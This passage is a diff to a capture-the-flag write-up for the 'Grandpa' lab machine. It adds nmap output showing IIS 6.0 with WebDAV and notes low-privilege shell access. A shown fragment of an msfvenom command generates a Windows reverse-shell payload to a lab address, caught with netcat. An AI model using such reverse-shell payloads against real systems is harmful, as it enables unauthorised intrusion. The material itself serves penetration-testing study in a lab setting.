@@ -10,7 +10,26 @@ Enumeration
 
 `nmap -A grandpa.htb`
 ```
+# Nmap 7.70 scan initiated Thu Apr 18 17:19:36 2019 as: nmap -A -p- -o nmap 10.10.10.15
+Nmap scan report for 10.10.10.15
+Host is up (0.073s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods:
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT                                                                                       
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan:
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK                                                                        
+|   WebDAV type: Unkown
+|   Server Date: Fri, 19 Apr 2019 00:16:28 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                              
+|_  Server Type: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr 18 17:21:30 2019 -- 1 IP address (1 host up) scanned in 115.01 seconds
 ```
 
 A very promising lead is that the server is running Server 2003, which has been EOL for some time. It also looks like a very old version of IIS is running on port 80. WebDav is also enabled.
@@ -36,13 +55,9 @@ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=4444 -f raw -v sc -
 
 The reason that I'm choosing to use the stageless payload is so I don't have to rely on `multi/handler` to capture my shells. I'm just using netcat to catch my reverse shells.
 
-Now let's run the exploit:
+![usershell](images/usershell.png)
 
-```
-
-```
-
-Looks like we're on the box as `NT Authority\Network Service`, which is actually a low privileged user, despite being part of `NT Authority`. We don't Grandpa's user.txt at `c:\users\grandpa\Desktop\user.txt`, so it's onto privesc from here.
+After running the exploit, it looks like we're on the box as `NT Authority\Network Service`, which is actually a low privileged user, despite being part of `NT Authority`. We don't Grandpa's user.txt at `c:\users\grandpa\Desktop\user.txt`, so it's onto privesc from here.
 
 Getting Root
 ------------
